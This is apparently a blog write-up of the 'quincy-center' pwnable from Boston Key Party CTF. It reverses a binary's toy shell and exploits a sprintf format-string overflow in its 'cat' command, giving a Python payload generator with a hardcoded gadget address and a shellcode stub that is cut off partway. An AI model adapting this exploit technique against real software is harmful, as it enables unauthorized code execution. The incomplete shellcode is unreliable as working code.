This is a write-up for **quincy-center**Â challenge, which is the first part of 3-chained pwnable challenge fromÂ <a href="https://ctftime.org/event/163" target="_blank">Boston Key Party CTF</a> last weekend.Â You can read about the other parts here: <a href="http://ppp.cylab.cmu.edu/wordpress/?p=1229" target="_blank">quincy-adams</a>, <a href="http://ppp.cylab.cmu.edu/wordpress/?p=1234" target="_blank">braintree</a>.

The goal is to get &#8220;uspace&#8221; flag by exploiting the user space process.

Looking at the output of <span class="lang:default decode:true  crayon-inline">file</span>Â , these are all x86_64 binaries.

<pre class="toolbar:2 toolbar-hide:false toolbar-delay:false show-title:false nums:false nums-toggle:false lang:default decode:true">$ file uspace 
uspace: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=98a138f60a8cfd6239de3181ef118776db40c8e6, stripped
</pre>

Opening up in IDA Pro, we see thatÂ <span class="lang:default decode:true  crayon-inline">sub_401470</span>Â has the process loop that prompts &#8220;bksh> &#8221; like a shell environment.

First, we see that there are semaphore locking/unlocking for I/O operations, which don&#8217;t seem to be too important at the moment. Then, the code to parse the command follows.

The general scheme for how the system works will be explained in the next series (kspace), so we will leave out the details of how things are implemented and maintained for now. Understanding the operations (create, list, remove, etc.) abstractly is good enough for exploiting the user space <img src="http://ppp.cylab.cmu.edu/wordpress/wp-includes/images/smilies/simple-smile.png" alt=":)" class="wp-smiley" style="height: 1em; max-height: 1em;" />

There are total of 6 commands it understands: **ls**, **create**, **rm**, **cat**, **sleep**, and **exit**.

  * ls &#8211; lists files on the system
  * create &#8211; creates a new file on the system
  * rm &#8211; deletes a file on the system
  * sleep &#8211; sleep&#8230;
  * exit &#8211; exits the shell

Let&#8217;s look at whatÂ **create** does for us.

The functionÂ takes the first argument to the command as a file name, and reads 256 bytes from the user for the content of the file that is being created. The buffer that is being read is large enough, so there&#8217;s no overflow here. Then, it &#8220;calls&#8221; into the kernel &#8220;syscall&#8221; (via shared memory) with the syscall number 96 and its two arguments (file name & contents buffer). Everything seems normal and sane, so we move on.

<div id="attachment_1915" style="width: 493px" class="wp-caption aligncenter">
  <a href="https://www.bpak.org/blog/wp-content/uploads/2015/03/uspace_2.png"><img class="wp-image-1915 " src="https://www.bpak.org/blog/wp-content/uploads/2015/03/uspace_2.png" alt="" width="483" height="212" /></a>

Looking through more functions, we find a vulnerable code inÂ **cat**, where it uses <span class="lang:default decode:true  crayon-inline ">sprintf</span>Â with the file contents buffer as itsÂ format string (aka trivial buffer overflow).

<div id="attachment_1918" style="width: 486px" class="wp-caption aligncenter">

**v12** is a stack buffer of size 256 bytes, and it&#8217;s located **bp-0x118**. Also, we noticed that the NX was disabled on this binary, so we could easily jump to our buffer (such as one of our arguments for the command). Conveniently, the pointers to our arguments are on the stack, so we can do a simple pop/pop/ret gadget to get an arbitrary code execution ðŸ˜€

<pre class="whitespace-after:1 lang:python decode:true" title="pwn_uspace.py">#!/usr/bin/python
import struct

def p(v):
    return struct.pack('&lt;Q', v)

def u(v):
    return struct.unpack('&lt;Q', v)[0]

f = open('payload', 'wb')

pop_pop_ret = 0x40110F

f.write('create fmt\n'.ljust(0x400, '#'))

payload = '%280x' + p(pop_pop_ret)
f.write(payload.ljust(0x100, '\0'))

f.write(('cat fmt ' + open('shell.bin').read()+ '\n').ljust(0x400, '#'))

</pre>

<pre class="whitespace-after:1 lang:asm decode:true" title="shell.asm">[BITS 64]

section .text
global _start
_start:

lea rdi, [rel binsh]
xor rsi, rsi
xor rdx, rdx

</pre>

<pre class="nums:false whitespace-after:1 lang:sh decode:true " title="Pwn!">$ nasm shell.asm -f bin -o shell.bin
$ python pwn_uspace.py
$ (cat ../uspace/payload; cat -) | sudo ./tz

uspace
</pre>

We have successfully got a shell as *uspace* user.  
(Note that since the challenge servers are down, the exploitation is shown in a local setup.)

Once we have arbitrary code running on uspace, we can then perform syscalls that are exposed by the kernel, but not available through a user-space interface (such as syscall number 92, shown below).

The analysis of kspace & tz will be continued on the next post.
